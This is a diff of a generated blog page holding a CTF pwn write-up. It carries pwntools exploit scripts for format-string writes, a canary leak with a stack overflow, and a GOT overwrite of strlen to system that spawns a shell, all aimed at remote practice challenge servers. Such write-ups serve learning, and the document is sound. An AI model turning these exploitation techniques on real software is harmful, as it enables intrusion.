@@ -23,7 +23,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -183,7 +183,9 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2020-08-10 21:42:09
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-08-10 21:42:09</span>
+        <span class="mobile">2020-08-10 21:42</span>
     </span>
     
         <span class="article-categories article-meta-item">
@@ -264,14 +266,14 @@
 <p>There I provided two payloads:</p>
 <ol>
 <li>the format built on my own –  sort numbers from smallest to largest.</li>
-<li>use functions that other people provided –  use integer overflow. </li>
+<li>use functions that other people provided –  use integer overflow.</li>
 </ol>
 <p>Clearly my own payload can solve this kind of challenge, here we have to write <code>0x02</code>, <code>0x22</code>, <code>0x33</code> and <code>0x22</code> to <code>0x0804A048</code>, <code>0x0804A049</code>, <code>0x0804A04a</code> and <code>0x0804A04b</code>, and the basic techniques I have already told  <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">before</a>, however we have to get used to using corresponding module to be more effective (just want to slack off).</p>
 <p>First we have to determine the parameter order of our input:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./realtime-data-monitor</span><br><span class="line">aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span><br><span class="line">aaaaaaaa,0xf7f862c0,0xfff9ce24,(nil),0xf7f5c000,0xf7f5c000,0xfff9cdd8,0x80484e7,0xfff9cbd0,0x200,0xf7f5c580,0xf7f7556d,0x61616161,0x61616161,0x2c70252c,0x252c7025,0x70252c70</span><br><span class="line">The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻</span><br></pre></td></tr></table></figure>
 <p>We can see our input <code>aaaaaaaa</code> locates at the 12th parameter of format string (13th parameter of <code>printf</code> function).</p>
 <p>Then use payload to write exploit.</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>It uses some codes/functions in the last example of <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">Format String Vulnerability Intro</a>.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>It uses some codes&#x2F;functions in the last example of <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">Format String Vulnerability Intro</a>.</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">48848</span>)</span><br><span class="line">shelf = ELF(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">key_addr = <span class="number">0x0804A048</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.sendline(&#x27;aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p&#x27;) # 12th</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target&gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,key_addr,<span class="number">0x02223322</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#print sh.recv() # recvuntil, recvline, ...</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>Using <code>fmtstr_payload</code> of <code>pwntools</code> has the same result. </p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;key_addr:<span class="number">0x02223322</span>&#125;)</span><br></pre></td></tr></table></figure>
@@ -295,7 +297,7 @@
 <p>In subfunction 2 (<code>sub_400960</code>), <code>printf(&amp;buf, &amp;buf);</code> is the format string vulnerability, we can use it to leak <code>Canary</code> content, then rewrite it when performing stack overflow.</p>
 <p>First of all, for format string vulnerability part, we have to indentify the order of <code>Canary</code> (input <code>aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</code>):</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./mary_morton</span><br><span class="line">Welcome to the battle !</span><br><span class="line">[Great Fairy] level pwned</span><br><span class="line">Select your weapon</span><br><span class="line">1. Stack Bufferoverflow Bug</span><br><span class="line">2. Format String Bug</span><br><span class="line">3. Exit the battle</span><br><span class="line">2</span><br><span class="line">aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span><br><span class="line">aaaaaaaa,0x7fff60e31170,0x7f,0x7fd6995815ce,0x1999999999999999,(nil),0x6161616161616161,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0xa70252c70252c</span><br><span class="line">1. Stack Bufferoverflow Bug</span><br><span class="line">2. Format String Bug</span><br><span class="line">3. Exit the battle</span><br></pre></td></tr></table></figure>
-<p>From the output we can see our input (<code>buf</code>) is the 6th parameter on the stack, while <code>buf</code> is at the <code>[rbp-90h]</code> and <code>v2</code> (that is <code>Canary</code>) is at the <code>[rbp-8h]</code>, so it needs <code>(0x90-0x8)/0x8 = 0x11 = 17</code> parameters more to get to <code>v2</code> (<code>Canary</code>). So <code>Canary</code> is the <code>17 + 6</code> = 23rd parameter. Pyaload should be <code>%23$p</code>.</p>
+<p>From the output we can see our input (<code>buf</code>) is the 6th parameter on the stack, while <code>buf</code> is at the <code>[rbp-90h]</code> and <code>v2</code> (that is <code>Canary</code>) is at the <code>[rbp-8h]</code>, so it needs <code>(0x90-0x8)/0x8 = 0x11 = 17</code> parameters more to get to <code>v2</code> (<code>Canary</code>). So <code>Canary</code> is the <code>17 + 6</code> &#x3D; 23rd parameter. Pyaload should be <code>%23$p</code>.</p>
 <p>Then we do stack overflow, see exploit for more detailed action.</p>
 <h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>My former exploits always use <code>recv()</code> to get output and do interaction. While using <code>recvuntil()</code> to replace <code>recv()</code> is a better way and will make exploit script common to both local and remote.</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./mary_morton&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">47717</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x4008DA</span></span><br><span class="line"><span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;Exit the battle \n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(sh.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + p64(<span class="number">0</span>) + p64(cat_flag_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
@@ -328,6 +330,36 @@
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;greeting-150&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">39474</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;greeting-150&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>] <span class="comment"># 0x8049a54</span></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># 0x8048490</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 0x80485ed</span></span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>] <span class="comment"># 0x80484f0</span></span><br><span class="line">init_addr = elf.sym[<span class="string">&#x27;_init&#x27;</span>] <span class="comment"># 0x8048404</span></span><br><span class="line">fini_addr = elf.sym[<span class="string">&#x27;_fini&#x27;</span>] <span class="comment"># 0x8048780</span></span><br><span class="line">init_array = elf.sym[<span class="string">&#x27;__init_array_start&#x27;</span>] <span class="comment"># 0x804992c</span></span><br><span class="line">fini_array = elf.sym[<span class="string">&#x27;__init_array_end&#x27;</span>] <span class="comment"># 0x8049934</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># &quot;Hello, I&#x27;m nao!\nPlease tell me your name... &quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aa&#x27;</span>+p32(fini_array+<span class="number">2</span>)+p32(strlen_got+<span class="number">2</span>)+p32(strlen_got)+p32(fini_array)</span><br><span class="line">payload += <span class="string">&#x27;%2016c%12$hn%13$hn%31884c%14$hn%96c%15$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
         </div>
 
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/format-string/">#format-string</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/stack-overflow/">#stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/canary/">#canary</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
         
 
         
@@ -383,14 +415,16 @@
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2018</span>&nbsp;-&nbsp;
+              <span>2020</span>
+              -
             
             2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
         </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
         </div>
+        
         
     </div>
 </footer>
@@ -400,58 +434,19 @@
 
     
         <div class="post-tools">
-            $li-border-radius = 5px;
-$li-margin-bottom = 12px;
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
 
-.post-tools-container {
-
-  .tools-list {
-
-    li {
-      cursor: pointer;
-      width: $post-tool-button-width;
-      height: $post-tool-button-width;
-      border-radius: 50%;
-      font-size: 1.2rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: $li-margin-bottom;
-      background: var(--background-color);
-      color: var(--default-text-color);
-
-      i {
-        color: var(--default-text-color);
-      }
-
-      &:hover {
-        background: var(--primary-color);
-        color: var(--background-color);
-
-        i {
-          color: var(--background-color);
-        }
-      }
-
-
-      &:last-child {
-        margin-bottom: 0;
-      }
-
-
-      hover-style(true, 1.06, 1.06);
-
-      &.page-aside-toggle {
-        display: none;
-
-        +keep-tablet() {
-          display: none !important;
-        }
-      }
-    }
-  }
-
-}
+        <!-- go comment -->
+        
+    </ul>
+</div>
 
         </div>
     
@@ -510,43 +505,9 @@ $li-margin-bottom = 12px;
         </aside>
     
 
-    .image-viewer-container {
-  position: fixed;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: rgba(0, 0, 0, 0);
-  visibility: hidden;
-  z-index: $z-index-8;
-  padding: 6%;
-  box-sizing: border-box;
-  transition-t("visibility, background", "0, 0", "0.3, 0.3", "ease, ease");
-
-  &.active {
-    background: rgba(0, 0, 0, 0.5);
-    visibility: visible;
-
-    img {
-      cursor: zoom-out;
-      transform: scale(1);
-      padding: 2px;
-      background: var(--background-color);
-    }
-  }
-
-  img {
-    max-width: 100%;
-    max-height: 100%;
-    transform: scale(0);
-    transition-t("transform", "0", "0.3", "ease");
-  }
-}
-
-
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
